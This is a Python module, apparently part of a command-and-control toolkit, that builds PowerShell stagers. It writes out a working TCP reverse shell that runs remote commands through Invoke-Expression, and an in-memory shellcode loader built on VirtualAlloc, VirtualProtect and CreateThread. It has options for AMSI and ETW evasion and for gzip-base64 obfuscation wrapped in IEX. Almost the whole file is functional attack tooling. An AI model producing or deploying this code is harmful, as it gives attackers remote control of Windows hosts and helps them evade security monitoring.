#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""PowerShell stager generators with AMSI/ETW evasion prelude."""

from __future__ import annotations

import base64
import gzip
import textwrap
from typing import Optional

from lib.c2.stager_evasion import powershell_prelude


def _ps_escape(value: str) -> str:
    return str(value).replace('"', '`"')


def build_reverse_shell_body(lhost: str, lport: int) -> str:
    host = _ps_escape(lhost)
    port = int(lport)
    return textwrap.dedent(
        f"""
        $core = "{host}"
        $port = {port}
        $socket = $null
        try {{
            $socket = New-Object System.Net.Sockets.Socket(
                [System.Net.Sockets.AddressFamily]::InterNetwork,
                [System.Net.Sockets.SocketType]::Stream,
                [System.Net.Sockets.ProtocolType]::Tcp)
            $socket.Connect($core, $port)
            $stream = New-Object System.Net.Sockets.NetworkStream($socket)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.Write("$core > ")
            while ($socket.Connected) {{
                $packet = $reader.ReadLine()
                if ($packet) {{
                    try {{
                        $output = Invoke-Expression $packet 2>&1 | Out-String
                        $writer.WriteLine($output)
                        $writer.Write("$core > ")
                    }} catch {{
                        $writer.WriteLine("Sync Error: " + $_.Exception.Message)
                    }}
                }}
            }}
        }} catch {{
            exit
        }} finally {{
            if ($socket) {{ $socket.Close() }}
        }}
        """
    ).strip()


def build_shellcode_stager_body(shellcode: bytes) -> str:
    b64 = base64.b64encode(shellcode).decode("ascii")
    return textwrap.dedent(
        f"""
        $b64 = @'
{b64}
'@
        $bytes = [Convert]::FromBase64String($b64)
        $code = @"
        using System;
        using System.Runtime.InteropServices;
        public class _KsWin {{
            [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
            [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
            [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
            [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
        }}
"@
        Add-Type $code
        $mem = [_KsWin]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new($bytes.Length), 0x3000, 0x04)
        [Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $bytes.Length)
        $old = 0
        [_KsWin]::VirtualProtect($mem, [UIntPtr]::new($bytes.Length), 0x20, [ref]$old) | Out-Null
        $th = [_KsWin]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        [_KsWin]::WaitForSingleObject($th, 0xFFFFFFFF) | Out-Null
        """
    ).strip()


def build_powershell_stager(
    *,
    lhost: str,
    lport: int,
    bypass_amsi: bool = False,
    patch_etw: bool = False,
    mode: str = "reverse_shell",
    shellcode: Optional[bytes] = None,
    gzip_encode: bool = False,
) -> str:
    prelude = powershell_prelude(bypass_amsi=bypass_amsi, patch_etw=patch_etw)
    if mode == "shellcode_stager":
        if not shellcode:
            raise ValueError("shellcode is required for shellcode_stager mode")
        body = build_shellcode_stager_body(shellcode)
    else:
        body = build_reverse_shell_body(lhost, lport)

    script = prelude + body
    if not gzip_encode:
        return script

    compressed = gzip.compress(script.encode("utf-8"))
    payload = base64.b64encode(compressed).decode("ascii")
    return (
        "$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String('"
        + payload
        + "')); $g = New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress); "
        "$r = New-Object IO.StreamReader($g); IEX $r.ReadToEnd()"
    )
